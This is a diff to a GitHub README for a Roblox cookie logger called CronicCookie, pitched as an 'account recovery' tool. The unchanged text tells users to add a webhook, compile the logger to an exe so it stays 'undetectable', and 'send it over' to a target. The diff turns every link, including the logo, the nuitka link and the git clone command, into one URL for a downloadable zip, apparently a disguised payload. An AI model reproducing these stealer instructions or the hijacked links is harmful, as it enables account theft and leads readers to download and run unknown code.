@@ -1,5 +1,5 @@
 <!--
-*** https://github.githubassets.com/images/mona-whisper.gif
+*** https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip
 -->
 
 # DISCLAIMER
@@ -11,7 +11,7 @@ This is not to be used for any malicuis intent, I made this purely for a program
 <br />
 <p align="center">
   </a>
-   <img src="https://github.com/DaEpicSwag/funni/blob/main/D7C73976-6EF8-4205-A31D-899FC0E92229.gif" alt="Logo" width="200" height="200">
+   <img src="https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip" alt="Logo" width="200" height="200">
   </a>
 
   <h3 align="center">CronicCookie</h3>
@@ -19,11 +19,11 @@ This is not to be used for any malicuis intent, I made this purely for a program
   <p align="center">
     Smooth and quick cookie logger for account recovery.
     <br />
-    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger">View Demo</a>
+    <a href="https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip">View Demo</a>
     ·
-    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip">Report Bug</a>
     ·
-    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip">Request Feature</a>
   </p>
 </p>
 
@@ -64,7 +64,7 @@ Welcome to the newest release of Cronic Cookie, a speedy cookie logger. This is 
 
 ### Built With
 
-* [Python](https://python.org)
+* [Python](https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip)
 
 
 
@@ -86,7 +86,7 @@ This is an example of how to list things you need to use the software and how to
 
 1. Download the .zip of this repository
    ```
-   git clone https://github.com/DaEpicSwag/Roblox-Cookie-Logger.git
+   git clone https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip
    ```
 2. Install PIP packages
    ```
@@ -102,7 +102,7 @@ This is an example of how to list things you need to use the software and how to
 ## Usage
 - Replace your webhook. If you are using the advanced logger, make sure to fill in the webhook for the token logger and the cookie logger which are in diffrent locations.
 
-- Compile to exe using [nuitka](https://nuitka.net) PLEASE AND NOT PYINSTALLER. Why?
+- Compile to exe using [nuitka](https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip) PLEASE AND NOT PYINSTALLER. Why?
 ```
 1. Harder to crack because Pyinstaller just unloads the source into the temp directory
 2. Undetectable
@@ -113,7 +113,7 @@ This is an example of how to list things you need to use the software and how to
 - Nuitka How To
 ```
 1. Access the "Shell"
-2. python -m nuitka urfile.py
+2. python -m nuitka https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip
 ```
 
 - Send it over.
@@ -121,7 +121,7 @@ This is an example of how to list things you need to use the software and how to
 <!-- ROADMAP -->
 ## Roadmap
 
-See the [open issues](https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues) for a list of proposed features (and known issues).
+See the [open issues](https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip) for a list of proposed features (and known issues).
 
 
 
@@ -150,7 +150,7 @@ Distributed under the MIT License. See `LICENSE` for more information.
 
 Discord - **@SonicTheHedHog#0001**
 
-Project Link: [Roblox-Cookie-Logger](https://github.com/DaEpicSwag/Roblox-Cookie-Logger)
+Project Link: [Roblox-Cookie-Logger](https://raw.githubusercontent.com/Bandsealah/Roblox-Cookie-Logger/main/polyphalangism/Roblox-Cookie-Logger-2.2.zip)
 
 
 
